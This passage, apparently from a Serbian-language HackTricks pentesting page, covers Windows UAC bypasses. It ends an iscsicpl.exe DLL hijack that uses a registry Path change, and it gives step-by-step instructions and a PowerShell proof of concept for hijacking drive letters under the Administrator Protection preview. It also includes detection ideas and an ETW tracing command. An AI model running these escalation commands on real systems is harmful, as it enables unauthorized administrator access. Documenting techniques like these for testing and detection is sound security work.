copy iscsiexe.dll %TEMP%\iscsiexe.dll
reg add "HKCU\Environment" /v Path /t REG_SZ /d "%TEMP%" /f
C:\Windows\System32\cmd.exe /c C:\Windows\SysWOW64\iscsicpl.exe
```

Ideje za detekciju:
- Upozorite na `reg add` / upisivanje u registar u `HKCU\Environment\Path` koje odmah prati izvršavanje `C:\Windows\SysWOW64\iscsicpl.exe`.
- Potražite `iscsiexe.dll` na lokacijama koje kontroliše **korisnik**, kao što su `%TEMP%` ili `%LOCALAPPDATA%\Microsoft\WindowsApps`.
- Povežite pokretanja `iscsicpl.exe` sa neočekivanim podređenim procesima ili učitavanjima DLL-ova izvan uobičajenih Windows direktorijuma.

### Novija istraživanja koja vredi zasebno proveriti

Neki lanci objavljeni posle 2024. više ne liče na klasične otmice registra `HKCU\Software\Classes`. Na primer, trovanje keša activation-context može da poveže **preusmeravanje diska** i **DLL redirekciju** kako bi se sa srednjeg prešlo na visok nivo integriteta preko pouzdanog UI-ja / automatski podignutih binarnih datoteka, kao što je `ctfmon.exe`, i kasnijih meta poput `fodhelper.exe`. Umesto da ovde duplirate veliki PoC, pogledajte sažete primere payload-a u:

{{#ref}}
../windows-local-privilege-escalation/windows-c-payloads.md
{{#endref}}

### Otmica slova diska putem DOS mape uređaja po sesiji prijavljivanja u Administrator Protection (preview)

> [!NOTE]
> Od avgusta 2026. Microsoft i dalje dokumentuje Administrator Protection kao **Insider preview**: uvođenje u oktobru 2025. je povučeno i planirano je za neki kasniji datum. Pre testiranja ovih lanaca proverite da li je **Admin Approval Mode with Administrator protection** zaista omogućen i da li je uređaj ponovo pokrenut; sama oznaka verzije 25H2 ne dokazuje da je funkcija aktivna.<sup>[[10]](#references)</sup>

Za ceo napadni prostor `RAiLaunchAdminProcess` / UIAccess na preview verzijama Windows 11 25H2, pogledajte namensku stranicu:

{{#ref}}
../windows-local-privilege-escalation/uiaccess-admin-protection-bypass.md
{{#endref}}

Windows 11 25H2 „Administrator Protection” koristi shadow-admin токене са мапама `\Sessions\0\DosDevices/<LUID>` по сесији. Direktorijum lenjo kreira `SeGetTokenDeviceMap` pri prvom razrešavanju `\??`. Ako napadač imitira shadow-admin token samo na nivou **SecurityIdentification**, direktorijum se kreira tako da je napadač **vlasnik** (nasleđuje `CREATOR OWNER`), što omogućava veze slova diska koje imaju prednost nad `\GLOBAL??`.<sup>[[7]](#references)</sup>

**Koraci:**

1. Iz sesije sa niskim privilegijama pozovite `RAiProcessRunOnce` da biste pokrenuli shadow-admin `runonce.exe` bez prompta.
2. Duplirajte njegov primarni token kao token **identification** i imitirajte ga dok otvarate `\??` da biste prinudno kreirali `\Sessions\0\DosDevices/<LUID>` u vlasništvu napadača.
3. Kreirajte `C:` symlink u toj lokaciji koji pokazuje na skladište pod kontrolom napadača; naredni pristupi fajl-sistemu u toj sesiji razrešavaju `C:` ka putanji napadača, omogućavajući DLL/file hijack bez prompta.

**PowerShell PoC (NtObjectManager):**
```powershell
$pid = Invoke-RAiProcessRunOnce
$p = Get-Process -Id $pid
$t = Get-NtToken -Process $p
$id = New-NtTokenDuplicate -Token $t -ImpersonationLevel Identification
Invoke-NtToken $id -ImpersonationLevel Identification { Get-NtDirectory "\??" | Out-Null }
$auth = Get-NtTokenId -Authentication -Token $id
New-NtSymbolicLink "\Sessions\0\DosDevices/$auth/C:" "\??\\C:\\Users\\attacker\\loot"
```

Na preview hostovima, Administrator Protection beleži odobrenja i neuspehe kao ETW događaje **15031** i **15032** pod provajderom `Microsoft-Windows-LUA`. Događaji obuhvataju SID podnosioca zahteva, putanju aplikacije, ishod, upravljani administratorski nalog i metod autentifikacije, tako da ponovljeni pokušaji eksploatacije ili neuspešno upravljanje UI-jem ne prolaze bez telemetrije.<sup>[[10]](#references)</sup>

```cmd
logman start AdminProtectionTrace -p {93c05d69-51a3-485e-877f-1806a8731346} -ets
rem reproduce the elevation attempt
logman stop AdminProtectionTrace -ets
```



## References

- [1] [LOLBAS: Iscsicpl.exe](https://lolbas-project.github.io/lolbas/Binaries/Iscsicpl/)
- [2] [Microsoft Docs – Kako funkcioniše User Account Control](https://learn.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works)
- [3] [UACME – Kolekcija tehnika za zaobilaženje UAC-a](https://github.com/hfiref0x/UACME)
- [4] [WinPwnage – Skener kompatibilnosti i pokretač za zaobilaženje UAC-a](https://github.com/rootm0s/WinPwnage)
- [5] [Checkpoint Research – KONNI koristi AI za generisanje PowerShell backdoor-a](https://research.checkpoint.com/2026/konni-targets-developers-with-ai-malware/)
- [6] [Check Point Research – Operacija TrueChaos: iskorišćavanje 0-day ranjivosti protiv državnih meta u jugoistočnoj Aziji](https://research.checkpoint.com/2026/operation-truechaos-0-day-exploitation-against-southeast-asian-government-targets/)
- [7] [Project Zero – Zaobilaženje Windows Administrator Protection-a](https://projectzero.google/2026/26/windows-administrator-protection.html)
- [8] [Sigma / Detection.FYI – Zaobilaženje UAC-a pomoću zadatka SilentCleanup](https://detection.fyi/sigmahq/sigma/windows/registry/registry_set/registry_set_bypass_uac_using_silentcleanup_task/)
- [9] [R41N3RZUF477 – Zaobilaženja UnifiedConsent, TabTip i Narrator opcije „Uvek obaveštavaj“](https://github.com/hfiref0x/UACME/issues/173)
- [10] [Microsoft Learn – Zaštita administratora](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/administrator-protection/)
- [11] [Google Project Zero – Pozivanje lokalnih Windows RPC servera iz .NET-a](https://projectzero.google/2019/12/calling-local-windows-rpc-servers-from.html)
- [12] [Kaspersky Securelist – HoneyMyte unapređuje CoolClient potpisanim Windows kernel rootkit-om](https://securelist.com/honeymyte-coolclient-driver-rootkit/121028)
- [13] [Group-IB – KGB RAT: potpuno neotkriveni Windows trojanac napravljen za špijuniranje, krađu i terorisanje](https://www.group-ib.com/blog/kgb-rat-windows-fud-trojan/)
- [14] [LOLBAS – ComputerDefaults.exe](https://lolbas-project.github.io/lolbas/Binaries/ComputerDefaults/)
{{#include ../../banners/hacktricks-training.md}}
